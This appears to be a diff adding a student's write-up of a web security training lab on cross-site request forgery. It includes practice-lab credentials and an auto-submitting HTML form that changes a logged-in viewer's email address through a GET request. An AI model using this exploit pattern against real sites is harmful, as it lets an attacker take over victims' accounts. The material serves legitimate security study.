@@ -1,0 +1,30 @@
+Lab #1:  CSRF vulnerability with no defenses
+
+
+Target: change the viewer's email address
+
+
+This lab's email change functionality is vulnerable to CSRF.
+
+Hint: 
+   
+    To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
+
+    You can log in to your own account using the following credentials: wiener:peter
+
+
+Analysis:
+
+  The change email page checks csrf token for post requests, but changing the email address is also possible with a GET request, which is wierd.
+  changing the form method to get, in the exploit script, solves the challenge.
+
+  <html>
+                <body>
+                    <form action="https://myPOrtSwiggerID.web-security-academy.net/my-account/change-email" method="GET">
+                        <input type="hidden" name="email" value="pwned@evil-user.net" />
+                    </form>
+                    <script>
+                        document.forms[0].submit();
+                    </script>
+                </body>
+  </html>
